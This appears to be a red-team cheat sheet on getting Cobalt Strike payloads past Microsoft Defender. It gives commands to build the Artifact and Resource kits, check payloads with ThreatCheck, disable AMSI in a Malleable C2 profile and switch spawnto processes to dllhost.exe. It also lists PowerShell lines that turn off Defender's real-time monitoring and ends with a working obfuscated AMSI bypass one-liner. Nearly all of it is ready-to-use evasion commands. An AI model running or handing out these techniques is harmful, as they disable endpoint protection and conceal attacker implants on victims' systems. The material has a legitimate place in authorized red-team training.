# Defender Antivirus

# Compile the Artifact kit

    $ ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts

# Compile the resource kit

    $ ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Verify if the payload is AV Safe

    PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
    PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI

# Load the CNA file: 

    Cobalt Strike > Script Manager > Load_ and select the CNA
THEN

    Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`

# Disable AMSI in Malleable C2 profile

    $ vim c2-profiles/normal/webbug.profile

# Right above the `http-get` block, add the following:

    post-ex {
        set amsi_disable "true";
    }

# Verify the modified C2 profile

    attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile

# Creating custom C2 profiles

    https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

### Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It does not apply to the powershell command.

# Behaviour Detections (change default process for fork & run)

    beacon> spawnto x64 %windir%\sysnative\dllhost.exe
    beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Change the default process for psexec

    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Disable Defender from local powershell session

    Get-MPPreference
    Set-MPPreference -DisableRealTimeMonitoring $true
    Set-MPPreference -DisableIOAVProtection $true
    Set-MPPreference -DisableIntrusionPreventionSystem $true

# AMSI bypass

    S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
